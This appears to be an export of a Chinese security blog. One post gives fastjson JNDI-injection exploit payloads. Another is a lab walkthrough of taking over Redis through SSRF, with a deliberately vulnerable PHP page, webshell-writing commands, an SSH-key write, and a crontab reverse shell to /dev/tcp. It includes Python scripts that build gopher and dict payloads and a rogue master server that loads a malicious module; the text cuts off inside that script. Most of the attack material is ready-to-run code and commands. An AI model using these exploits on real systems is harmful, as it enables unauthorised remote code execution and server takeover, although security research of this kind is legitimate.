<h1 id="fastjson-lt-1-2-66"><a href="#fastjson-lt-1-2-66" class="headerlink" title="fastjson&lt;=1.2.66"></a>fastjson&lt;=1.2.66</h1><h2 id="漏洞信息-1"><a href="#漏洞信息-1" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
<li>fastjson &lt;= 1.2.66</li>
</ul>
<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>开启autoType</li>
<li>依赖第三方包shiro</li>
<li>依赖第三方包slf4j-simple</li>
</ul>
<p>OR</p>
<ul>
<li>开启autoType</li>
<li>依赖第三方包Anteros-DBCP</li>
<li>依赖第三方包Anteros-Core</li>
</ul>
<p>OR</p>
<ul>
<li>开启autoType</li>
<li>依赖第三方包ignite-jta-incubating</li>
</ul>
<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="JndiObjectFactory"><a href="#JndiObjectFactory" class="headerlink" title="JndiObjectFactory"></a>JndiObjectFactory</h3><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p>先定位到<code>org.apache.shiro.jndi.JndiObjectFactory</code>类的getInstance()函数。</p>
<p><img src="2.png" alt=""></p>
<p>这里的this.lookup事实上也是调用了JndiTemplate.lookup()函数，满足jndi注入的环境。那么就需要控制this.resourceName的值为jndi注入的uri即可。</p>
<p>在利用这条链时，反序列化需要使用parseObject。因为parseObject需要返回JSONObject类型的对象，在使用toJSON进行转换的时候会遍历其字段，并调用getter获取value放入Map，从而调用到了getInstance方法。</p>
<h4 id="exp构造"><a href="#exp构造" class="headerlink" title="exp构造"></a>exp构造</h4><p>根据上述分析，exp如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,</span><br><span class="line">  &quot;resourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="AnterosDBCPConfig"><a href="#AnterosDBCPConfig" class="headerlink" title="AnterosDBCPConfig"></a>AnterosDBCPConfig</h3><h4 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h4><p>首先定位到<code>br.com.anteros.dbcp.AnterosDBCPConfig</code>类，通过搜寻lookup函数，可以定位到其getObjectOrPerformJndiLookup()函数。</p>
<p><img src="3.png" alt=""></p>
<p>可以看到他有一个完整的JNDI注入环境。但是由于该函数是private类型，因此不能在反序列化时直接被调用，继续寻找一个调用此函数的方法。定位到setMetricRegistry()函数，如下所示:</p>
<p><img src="4.png" alt=""></p>
<p>它调用了getObjectOrPerformJndiLookup()函数。只需要将metricRegistry的值设置为jndi注入的uri值。</p>
<h4 id="exp构造-1"><a href="#exp构造-1" class="headerlink" title="exp构造"></a>exp构造</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,</span><br><span class="line">	&quot;metricRegistry&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="CacheJndiTmLookup"><a href="#CacheJndiTmLookup" class="headerlink" title="CacheJndiTmLookup"></a>CacheJndiTmLookup</h3><p>首先定位到<code>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</code>类。如下所示:</p>
<p><img src="5.png" alt=""></p>
<p>该类比较简单，在getTm()函数中存在JNDI注入的整个环境，其中jndi的uri即代码中的s来源于jndiNames，因此只需要将jndiNames中的值放入一个jndi注入的uri即可。</p>
<h4 id="exp构造-2"><a href="#exp构造-2" class="headerlink" title="exp构造"></a>exp构造</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,</span><br><span class="line">	&quot;jndiNames&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="补丁-1"><a href="#补丁-1" class="headerlink" title="补丁"></a>补丁</h2><p>增加黑名单。而且在1.2.68也就是最新版本中增加了新的安全参数Safe_mode。打开这个模式之后直接禁用autoType功能。虽然有这个Safe_mode，如果开启这个模式的话，相当于禁用了@type fastjson反序列化这个功能。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://drops.blbana.cc/2020/04/16/Fastjson%E5%8E%86%E5%8F%B2%E8%A1%A5%E4%B8%81Bypass%E5%88%86%E6%9E%90/#%E7%89%88%E6%9C%AC1-2-47" target="_blank" rel="noopener">Fastjson历史补丁Bypass分析</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>Ripstech Java Security 2019 Calendar复现系列</title>
    <url>/2020/04/30/java-calendar-2019/</url>
    <content><![CDATA[<p>为了了解java安全，也算是入门一下java安全，把Ripstech上的2019 Java Calendar复现了一遍。</p>
<a id="more"></a>
<p>具体分析发表在了先知社区。</p>
<p><a href="https://xz.aliyun.com/t/7098" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(一)</a><br><a href="https://xz.aliyun.com/t/7162" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(二)</a><br><a href="https://xz.aliyun.com/t/7206" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(三)</a><br><a href="https://xz.aliyun.com/t/7247" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(四)</a>  </p>
<p>环境放在了<a href="https://github.com/ananaskr/Java_Calendar_2019" target="_blank" rel="noopener">github</a>上。</p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
  </entry>
  <entry>
    <title>SSRF-内网Redis Getshell</title>
    <url>/2020/04/17/SSRF-Redis/</url>
    <content><![CDATA[<p>Redis是常见的内网服务，因其默认配置未授权访问或使用弱口令认证，可以导致getshell。这篇文章通过实验的方式介绍了四种内网Redis Getshell的方式。</p>
<a id="more"></a>

<p>经过总结，目前网上对于Redis常见的getshell方式有以下几种:  </p>
<ul>
<li><strong>绝对路径写Webshell</strong></li>
<li><strong>写入ssh公钥</strong></li>
<li><strong>写crontab计划任务反弹shell(针对CentOS)</strong></li>
<li><strong>主从复制(4.0 &lt; Redis)</strong> </li>
</ul>
<p>这篇文章通过实验依次介绍几种方法的使用以及一些脚本，脚本以及此次实验的环境都放在了<a href="https://github.com/ananaskr/Escalation_Database/tree/master/Redis" target="_blank" rel="noopener">github</a>。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>首先介绍一下Redis以及此次实验的相关配置。</p>
<h3 id="Redis介绍"><a href="#Redis介绍" class="headerlink" title="Redis介绍"></a>Redis介绍</h3><p>Redis常用命令有以下几个:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">info                    查看信息  </span><br><span class="line">flushall                删除数据库所有内容  </span><br><span class="line">flushdb                 刷新数据库  </span><br><span class="line">keys *                  查看所有键  </span><br><span class="line">set key value           设置变量  </span><br><span class="line">config set dir dirpath  设置路径  </span><br><span class="line">config set dbfilename   设置文件名  </span><br><span class="line">save                    保存</span><br></pre></td></tr></table></figure>

<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><ul>
<li>docker</li>
<li>centos7.0 + Redis5.0</li>
<li>Python3.6.0</li>
</ul>
<p>php代码放置在docker启动的web服务器上，是一个未经任何防御的SSRF的php代码。如下所示:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">		$link = $_GET[<span class="string">'url'</span>];</span><br><span class="line">		$curlobj = curl_init();</span><br><span class="line">		curl_setopt($curlobj, CURLOPT_POST,<span class="number">0</span>);</span><br><span class="line">		curl_setopt($curlobj, CURLOPT_URL,$link);</span><br><span class="line">		curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">		curl_setopt($curlobj, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">		$result=curl_exec($curlobj);</span><br><span class="line">		<span class="keyword">echo</span> $result;</span><br><span class="line">		curl_close($curlobj);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Redis在另一个镜像中，将Redis绑定在<code>0.0.0.0</code>，因此在宿主机访问<code>curl -v dict://127.0.0.1:6379/info</code>可以成功。但对于docker里的web服务器，<code>docker.for.mac.host.internal</code>为能访问宿主机的地址。即<code>docker.for.mac.host.internal:6379</code>来表示访问内网中的Redis。</p>
<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>基于前面搭建的环境，对这几种利用方式进行了复现。</p>
<h3 id="1-绝对路径写webshell"><a href="#1-绝对路径写webshell" class="headerlink" title="1. 绝对路径写webshell"></a>1. 绝对路径写webshell</h3><p>绝对路径写webshell的方法利用Redis的写权限向web目录中写入webshell，然后通过webshell来getshell。绝对路径写webshell的方法适用于以下场景:</p>
<ol>
<li>开启了web服务</li>
<li>Redis具有对web路径的写权限</li>
<li>知道web目录物理路径</li>
</ol>
<p>以写入php语言的webshell为例，需要在redis中执行以下命令以达到写入webshell的目的。  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#39;&lt;?php eval($_GET[&quot;cmd&quot;])&#39;;?&gt;&#39;</span><br><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>在内网中最常用两种协议<code>dict://</code>与<code>gopher://</code>。其中<code>dict://</code>需要一步步地执行redis getshell的exp，而gopher协议只需要一个url请求即可。在这里使用gopher协议来进行利用。  </p>
<p>Redis服务器与客户端通过RESP协议通信，在利用gopher协议时，需要将需要执行的命令转化为redis RESP协议的格式。这里参考了<a href="https://xz.aliyun.com/t/5665#toc-14" target="_blank" rel="noopener">网上的一个脚本</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exp_resp.py</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">protocol = <span class="string">"gopher://"</span></span><br><span class="line">ip = <span class="string">"docker.for.mac.host.internal"</span></span><br><span class="line">port = <span class="string">"6379"</span></span><br><span class="line"></span><br><span class="line">shell = <span class="string">"\n\n&lt;?php system($_GET["</span>cmd<span class="string">"]);?&gt;\n\n"</span></span><br><span class="line">filename = <span class="string">"shell.php"</span></span><br><span class="line">path = <span class="string">"/var/www/html"</span></span><br><span class="line">passwd = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">cmd = [	<span class="string">"flushall"</span>,</span><br><span class="line">		<span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">		<span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">		<span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">		<span class="string">"save"</span></span><br><span class="line">		]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line"></span><br><span class="line">payload = protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">	CRLF = <span class="string">"\r\n"</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">	cmd = <span class="string">""</span></span><br><span class="line">	cmd += <span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd += CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">	cmd += CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += quote(redis_format(x))</span><br><span class="line">	print(payload)</span><br></pre></td></tr></table></figure>

<p>运行的结果如下所示:</p>
<p><img src="SSRF-Redis-1.png" alt=""></p>
<p>此payload需放在浏览器中作为get请求的url的参数值，它需要进行一次url编码。即最后的payload为<code>http://127.0.0.1:7777/index.php?url=gopher.....</code></p>
<p>在redis中可以看到执行成功。接下来访问<code>http://127.0.0.1/shell.php?cmd=command</code>即可。</p>
<p><img src="SSRF-Redis-2.png" alt=""></p>
<h3 id="2-写ssh公钥免密登录"><a href="#2-写ssh公钥免密登录" class="headerlink" title="2. 写ssh公钥免密登录"></a>2. 写ssh公钥免密登录</h3><p>写ssh公钥的方法利用的是ssh中提供可利用私钥登录的方式，将公钥写入特定目录下，导致攻击者可以私钥直接登录。写ssh公钥的方法适用于以下场景:</p>
<ol>
<li>开启了ssh服务，且允许免密登录</li>
<li>需要root权限启动redis</li>
</ol>
<p>允许免密登录的配置在<code>etc/sshd/sshd_config</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line"></span><br><span class="line">AuthorizedKeysFile	.ssh&#x2F;authorized_keys .ssh&#x2F;authorized_keys2</span><br></pre></td></tr></table></figure>

<p>整个过程分为3步: 1) 生成key pair; 2) 写入ssh key; 3）登录。  </p>
<h4 id="生成key-pair"><a href="#生成key-pair" class="headerlink" title="生成key pair"></a>生成key pair</h4><p>在本地生成公私钥对，进入<code>~/.ssh</code>，执行<code>ssh-keygen -t rsa</code>命令，输入生成的文件名<code>authorized_keys</code>。</p>
<h4 id="写入ssh-key"><a href="#写入ssh-key" class="headerlink" title="写入ssh key"></a>写入ssh key</h4><p>写入ssh key的方式与写入webshell一样，只是改变了写入的目录以及写入的内容。redis运行在什么用户，就能直接以此用户身份进行登录。一般是些写入<code>/root/.ssh</code>目录，也可以写入用户目录，不过需要多一步猜测用户目录。若目录不存在，可利用crontab创建目录，这一方式在下面会介绍到。写入ssh key需要在redis中执行以下命令:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#39;ssh-rsa xxx...xxx&#39;</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>同理，可用gopher可以完成此次利用。</p>
<h3 id="0x03-写crontab计划反弹shell"><a href="#0x03-写crontab计划反弹shell" class="headerlink" title="0x03 写crontab计划反弹shell"></a>0x03 写crontab计划反弹shell</h3><p>写crontab计划的方式适用于以下场景:</p>
<ol>
<li>系统为Centos。</li>
<li>root权限启动redis。</li>
</ol>
<blockquote>
<p>此方法只能在CentOs上使用，Ubuntu上行不通主要有2点原因。1) 默认Redis写文件后是644的权限，但是Ubuntu要求执行定时任务<code>/var/spool/cron/ceontabs/&lt;username&gt;</code>的权限必须是600，才会执行，而CentOS的定时任务<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行。2) Redis保存RDB会存在乱码，在Ubuntu上会报错，而在CentOS上不会报错。</p>
</blockquote>
<p>执行的命令如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#39;\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1\n\n&#39;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>前面介绍了使用gopher协议生成payload，此方法也可以使用。但是这里介绍了使用<code>dict://</code>协议来进行利用。这里介绍另一个经典脚本，需要302.php以及shell.php放置在vps上。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="string">'6379'</span></span><br><span class="line"></span><br><span class="line">vul_httpurl = <span class="string">"http://127.0.0.1:7777/index.php?url="</span></span><br><span class="line"></span><br><span class="line">_location = <span class="string">"http://vps:7777/302.php"</span></span><br><span class="line"></span><br><span class="line">shell_location = <span class="string">"http://vps:7777/shell.php"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1 flush db</span></span><br><span class="line">scheme = <span class="string">"dict"</span></span><br><span class="line">ip = <span class="string">"docker.for.mac.host.internal"</span></span><br><span class="line">port = <span class="number">6379</span></span><br><span class="line">bhost = <span class="string">"vps"</span></span><br><span class="line">bport = <span class="number">2333</span></span><br><span class="line">_payload = <span class="string">'?scheme=&#123;scheme&#125;%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=flushall'</span>.format(</span><br><span class="line">	scheme = scheme,</span><br><span class="line">	ip = ip,</span><br><span class="line">	port = port</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;location&#125;&#123;payload&#125;'</span>.format(</span><br><span class="line">	vul_httpurl = vul_httpurl,</span><br><span class="line">	location = _location,</span><br><span class="line">	payload = _payload</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">print(exp_uri)</span><br><span class="line">print(len(requests.get(exp_uri).text))</span><br><span class="line"></span><br><span class="line"><span class="comment">#2 set crontab command</span></span><br><span class="line">_payload = <span class="string">'?scheme=&#123;scheme&#125;%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26bhost=&#123;bhost&#125;%26bport=&#123;bport&#125;'</span>.format(</span><br><span class="line">	scheme = scheme,</span><br><span class="line">	ip = ip,</span><br><span class="line">	port = port,</span><br><span class="line">	bhost = bhost,</span><br><span class="line">	bport = bport</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;shell_location&#125;&#123;payload&#125;'</span>.format(</span><br><span class="line">	vul_httpurl = vul_httpurl,</span><br><span class="line">	shell_location = shell_location,</span><br><span class="line">	payload = _payload</span><br><span class="line">	) </span><br><span class="line"></span><br><span class="line">print(exp_uri)</span><br><span class="line">print(requests.get(exp_uri).text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#3 config set dir</span></span><br><span class="line">_payload = <span class="string">'?scheme=&#123;scheme&#125;%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=config:set:dir:/var/spool/cron'</span>.format(</span><br><span class="line">	scheme = scheme,</span><br><span class="line">	ip = ip,</span><br><span class="line">	port = port</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;location&#125;&#123;payload&#125;'</span>.format(</span><br><span class="line">	vul_httpurl = vul_httpurl,</span><br><span class="line">	location = _location,</span><br><span class="line">	payload = _payload</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">print(exp_uri)</span><br><span class="line">print(requests.get(exp_uri).text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#3 config set dbfilename</span></span><br><span class="line">_payload = <span class="string">'?scheme=&#123;scheme&#125;%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=config:set:dbfilename:root'</span>.format(</span><br><span class="line">	scheme = scheme,</span><br><span class="line">	ip = ip,</span><br><span class="line">	port = port</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;location&#125;&#123;payload&#125;'</span>.format(</span><br><span class="line">	vul_httpurl = vul_httpurl,</span><br><span class="line">	location = _location,</span><br><span class="line">	payload = _payload</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">print(exp_uri)</span><br><span class="line">print(requests.get(exp_uri).text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#4 save</span></span><br><span class="line">_payload = <span class="string">'?scheme=&#123;scheme&#125;%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=save'</span>.format(</span><br><span class="line">	scheme = scheme,</span><br><span class="line">	ip = ip,</span><br><span class="line">	port = port</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;location&#125;&#123;payload&#125;'</span>.format(</span><br><span class="line">	vul_httpurl = vul_httpurl,</span><br><span class="line">	location = _location,</span><br><span class="line">	payload = _payload</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">print(exp_uri)</span><br><span class="line">print(requests.get(exp_uri).text)</span><br></pre></td></tr></table></figure>

<p>运行这个脚本并在vps上监听2333端口，等一小会儿就能看到反弹shell的连接。</p>
<blockquote>
<p>注意: 当curl设置了仅允许HTTP/HTTPS，且允许302跳转的情况下，可利用302跳转进行绕过。</p>
</blockquote>
<h3 id="4-主从复制"><a href="#4-主从复制" class="headerlink" title="4. 主从复制"></a>4. 主从复制</h3><p>主从复制这一利用方式是由LC/BC战队队员Pavel Toporkov在zeronights 2018上提出的，<a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">PPT</a>。它主要是利用主节点向从节点同步数据时发送恶意RDB文件来实现getshell的。主从复制的RCE适用于以下场景:</p>
<ul>
<li>Redis 4.x以及5.x版本</li>
</ul>
<p>整个的步骤分为4步。</p>
<p>1）<strong>将目标redis设置为slave</strong>  </p>
<p>建立主从关系只需要在从节点操作即可，主节点不用任何操作。在这条命令执行以后，就会向主节点发送请求同步内容。解除主从关系可以执行<code>slaveof no one</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">slaveof ip port</span><br></pre></td></tr></table></figure>

<p>2）<strong>设置redis的数据库文件</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;tmp</span><br><span class="line">config set dbfilename exp.so</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在这里最好将当前目录设置为/tmp目录这样的，提高容错率。</p>
</blockquote>
<p>3) <strong>从master接收module</strong><br>自从Redis4.x之后redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，实现新的Redis命令。Redis模块是动态库，可以在启动时或使用<code>MODULE LOAD</code>命令加载到Redis中。恶意的so文件可参考<a href="https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK" target="_blank" rel="noopener">RedisModulesSDK</a>  </p>
<p>在这个过程当中，利用全量复制将master上的RDB文件同步到slave上，从而加载恶意so文件达到RCE的目的。因此，需要以master的身份向slave传输so文件，在弄清楚他们之间流程后，便可伪造一个假的redis服务器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">master   &lt;------ PING  &lt;-----    slave</span><br><span class="line">master   ------&gt; +PONG -----&gt;    slave</span><br><span class="line">master   &lt;--- REPLCONF &lt;-----    slave</span><br><span class="line">master   -------&gt; +OK  -----&gt;    slave</span><br><span class="line">master   &lt;--- REPLCONF &lt;-----    slave</span><br><span class="line">master   -------&gt; +OK  -----&gt;    slave</span><br><span class="line">master   &lt;------ PSYNC &lt;-----    slave</span><br></pre></td></tr></table></figure>

<p>对于我们而言，我们只需要关注在收到slave的请求后，如何回应它，以及在收到PSYNC后发送恶意的so文件。提出该方式的作者编写了一个脚本来发送exp.so文件数据。这里使用了网上的一个脚本。</p>
<p>redis_slave.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CRLF = <span class="string">"\r\n"</span></span><br><span class="line">payload = open(<span class="string">"exp.so"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line">exp_filename = <span class="string">"exp.so"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> CRLF</span><br><span class="line">	<span class="keyword">global</span> payload</span><br><span class="line">	redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">	cmd = <span class="string">""</span></span><br><span class="line">	cmd += <span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd += CRLF+<span class="string">"$"</span>+str(len(x))+CRLF+x</span><br><span class="line">	cmd += CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_connect</span><span class="params">(shost,sport)</span>:</span></span><br><span class="line">	sock = socket.socket()</span><br><span class="line">	sock.connect((shost,sport))</span><br><span class="line">	<span class="keyword">return</span> sock</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(sock,cmd)</span>:</span></span><br><span class="line">	sock.send(redis_format(cmd).encode())</span><br><span class="line">	print(sock.recv(<span class="number">1024</span>).decode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">interact_shell</span><span class="params">(sock)</span>:</span></span><br><span class="line">	flag = <span class="literal">True</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">while</span> flag:</span><br><span class="line">			shell = input(<span class="string">"\033[1;32;40m[*]\033[0m "</span>)</span><br><span class="line">			shell = shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)</span><br><span class="line">			<span class="keyword">if</span> shell == <span class="string">"exit"</span> <span class="keyword">or</span> shell == <span class="string">"quit"</span>:</span><br><span class="line">				flag = <span class="literal">False</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				send(sock,<span class="string">"system.exec &#123;&#125;"</span>.format(shell))</span><br><span class="line">	<span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RogueServer</span><span class="params">(mport)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> CRLF</span><br><span class="line">	<span class="keyword">global</span> payload</span><br><span class="line">	flag = <span class="literal">True</span></span><br><span class="line">	result = <span class="string">""</span></span><br><span class="line">	sock = socket.socket()</span><br><span class="line">	sock.bind((<span class="string">"0.0.0.0"</span>, mport))</span><br><span class="line">	sock.listen(<span class="number">10</span>)</span><br><span class="line">	clientSock, address = sock.accept()</span><br><span class="line">	<span class="keyword">while</span> flag:</span><br><span class="line">		data = clientSock.recv(<span class="number">1024</span>).decode(<span class="string">"utf-8"</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"PING"</span> <span class="keyword">in</span> data:</span><br><span class="line">			result = <span class="string">"+PONG"</span>+CRLF</span><br><span class="line">			clientSock.send(result.encode())</span><br><span class="line">			flag = <span class="literal">True</span></span><br><span class="line">		<span class="keyword">elif</span> <span class="string">"REPLCONF"</span> <span class="keyword">in</span> data:</span><br><span class="line">			result = <span class="string">"+OK"</span>+CRLF</span><br><span class="line">			clientSock.send(result.encode())</span><br><span class="line">			flag = <span class="literal">True</span></span><br><span class="line">		<span class="keyword">elif</span> <span class="string">"PSYNC"</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">"SYNC"</span> <span class="keyword">in</span> data:</span><br><span class="line">			result = <span class="string">"+FULLRESYNC "</span>+<span class="string">"a"</span>*<span class="number">40</span>+<span class="string">" 1"</span>+CRLF</span><br><span class="line">			result += <span class="string">"$"</span>+str(len(payload))+CRLF</span><br><span class="line">			result = result.encode()</span><br><span class="line">			result += payload</span><br><span class="line">			result += CRLF.encode()</span><br><span class="line">			clientSock.send(result)</span><br><span class="line">			flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	mhost = <span class="string">"docker.for.mac.host.internal"</span></span><br><span class="line">	mport = <span class="number">6380</span></span><br><span class="line">	shost = <span class="string">"127.0.0.1"</span></span><br><span class="line">	sport = <span class="number">6379</span></span><br><span class="line">	passwd = <span class="string">""</span></span><br><span class="line">	redis_sock = redis_connect(shost,sport)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> passwd:</span><br><span class="line">		send(redis_sock,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">	send(redis_sock,<span class="string">"SLAVEOF &#123;&#125; &#123;&#125;"</span>.format(mhost,mport))</span><br><span class="line">	send(redis_sock,<span class="string">"config set dbfilename &#123;&#125;"</span>.format(exp_filename))</span><br><span class="line">	